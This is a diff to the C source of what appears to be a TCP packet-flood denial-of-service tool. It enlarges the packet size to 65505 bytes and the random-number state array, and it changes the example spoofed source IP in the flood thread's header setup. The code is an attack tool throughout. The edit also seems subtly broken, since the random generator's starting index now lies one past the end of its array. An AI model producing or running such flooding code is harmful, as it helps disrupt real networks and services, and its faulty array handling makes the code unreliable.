@@ -12,11 +12,11 @@
 #include <netinet/in.h>
 #include <arpa/inet.h>
 
-#define MAX_PACKET_SIZE 4096
+#define MAX_PACKET_SIZE 65505
 #define PHI 0x9e3779b9
 #define MAXTTL 255
 
-static unsigned long int Q[4096], c = 362436;
+static unsigned long int Q[65505], c = 362436;
 static unsigned int floodport;
 volatile int limiter;
 volatile unsigned int pps;
@@ -27,14 +27,14 @@ void init_rand(unsigned long int x) {
     Q[0] = x;
     Q[1] = x + PHI;
     Q[2] = x + PHI + PHI;
-    for (int i = 3; i < 4096; i++) {
+    for (int i = 3; i < 65505; i++) {
         Q[i] = Q[i - 3] ^ Q[i - 2] ^ PHI ^ i;
     }
 }
 
 // Custom random number generator (CMWC algorithm)
 unsigned long int rand_cmwc(void) {
-    static unsigned long int i = 4095;
+    static unsigned long int i = 65505;
     unsigned long long int t, a = 18782LL;
     unsigned long int x, r = 0xfffffffe;
     
@@ -128,7 +128,7 @@ void *flood(void *par1) {
     }
 
     memset(datagram, 0, MAX_PACKET_SIZE);
-    setup_ip_header(iph, "192.168.3.100");  // Source IP (example)
+    setup_ip_header(iph, "192.168.89.100");  // Source IP (example)
     setup_tcp_header(tcph);
 
     tcph->dest = htons(floodport);
